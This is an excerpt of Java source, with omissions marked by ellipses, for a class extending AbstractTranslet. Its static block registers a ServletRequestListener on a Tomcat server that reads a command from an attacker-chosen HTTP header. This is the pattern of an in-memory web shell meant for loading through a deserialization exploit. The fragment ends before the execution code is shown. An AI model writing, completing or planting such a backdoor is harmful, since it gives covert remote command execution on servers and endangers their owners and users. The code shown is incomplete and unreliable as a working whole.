...
public class TomcatListener extends AbstractTranslet {
    static {
        try {
...
//                                    o.addApplicationEventListener(mylistener);
                                    o.addApplicationEventListener(new ServletRequestListener() {
                                        @Override
                                        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
                                            ServletRequest request = servletRequestEvent.getServletRequest();
                                            HttpServletRequest servletRequest = (HttpServletRequest) request;
                                            if (servletRequest.getHeader(cmdHeader) != null) {
                                                try {
                                                    String cmd = servletRequest.getHeader(cmdHeader);
                                                    ...
                                                    org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.get(request);
